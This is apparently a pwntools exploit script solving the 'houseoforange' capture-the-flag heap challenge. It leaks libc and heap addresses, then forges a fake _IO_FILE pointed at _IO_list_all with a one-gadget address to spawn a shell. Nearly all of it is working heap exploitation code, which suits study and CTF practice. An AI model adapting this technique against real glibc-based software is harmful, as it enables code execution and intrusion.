# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
r = process('./houseoforange')

# libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

binn = ELF("./houseoforange")

def build(name, l=0, price=2, color=1):
    r.recvuntil("Your choice : ")
    r.sendline("1")
    r.recvuntil("Length of name :")
    if not l:
        l = len(name)
    r.sendline(str(l))
    r.recvuntil("Name :")
    r.send(name)
    r.recvuntil("Price of Orange:")
    r.sendline(str(price))
    r.recvuntil("Color of Orange:")
    r.sendline(str(color)) #color

def upgrade(name, price=3, color=1):
    r.recvuntil("Your choice : ")
    r.sendline("3")
    r.recvuntil("Length of name :")
    r.sendline(str(len(name)))
    r.recvuntil("Name:") # fuck it, not same as build
    r.send(name)
    r.recvuntil("Price of Orange:")
    r.sendline(str(price))
    r.recvuntil("Color of Orange:")
    r.sendline(str(color)) #color

def see():
    r.recvuntil("Your choice : ")
    r.sendline("2")   
def doit():
    build("A")
    # build("B")
    # return
    payload = ''
    payload += p64(0x42)*7 + p64(0xfa1)
    upgrade(payload)
    # return
    build("B"*0x1000) # trig top go to unsort bin
    # return

    # build("A",l=40 )   
    build("A",l=0x400 )   
    # return

    see()
    # return
    r.recv(16)
    leak = u64(r.recv(6).ljust(8, '\x00')) #TODO, why can we leak in here, set br around build('a',l=40)
    # libc_base = leak - 0x3c4b41 -0x600
    libc_base = leak - 0x3c5141
    # system_addr = libc_base +  0x45390 
    system_addr = libc_base + 0x45216 # bingo
    # system_addr = libc_base + 0x4526a
    # system_addr = libc_base + 0xf02a4
    # system_addr = libc_base + 0xf1147 

    # _IO_list_all
    io_list_all = libc_base + 0x3c5520 # 0x7ffff7dd2520
    print("----leak: ", hex(leak))
    print("----libc_base: ", hex(libc_base)) # 0x7ffff7a0d000
    print("----system_addr: ", hex(system_addr)) # 
    print("----io_list_all: ", hex(io_list_all)) # 

    # return
    upgrade('A'*16)
    see()
    r.recv(32)
    leak = u64(r.recv(6).ljust(8, '\x00')) # 0x00005555557580c0 
    heap_base = leak - 0xc0
    print("----heap_base: ", hex(heap_base)) # 0x555555758000

    # return
    # build("BB", l=40) # can't do this

   


    payload = '' # e1 failed
    payload += 'A'*0x420 +"/bin/sh\0".ljust(8,'\x00')+p64(0x61)+p64(libc_base+0x3c4b78)+p64(io_list_all-0x10)
    payload += p64(2) +p64(3) +9*p64(0) +p64(system_addr)
    payload +=p64(0) *11 + p64(heap_base+0x550)


    upgrade(payload)

    # can't auto , why???
    # r.recv(timeout=5)
    # # r.recvuntil("Your choice : ")
    # r.sendline('1')
    # r.sendline('pwd')





doit()
print(str(r.proc.pid))
r.recv(timeout=0.1)
gdb.attach(r, """
heap
""");
r.interactive()

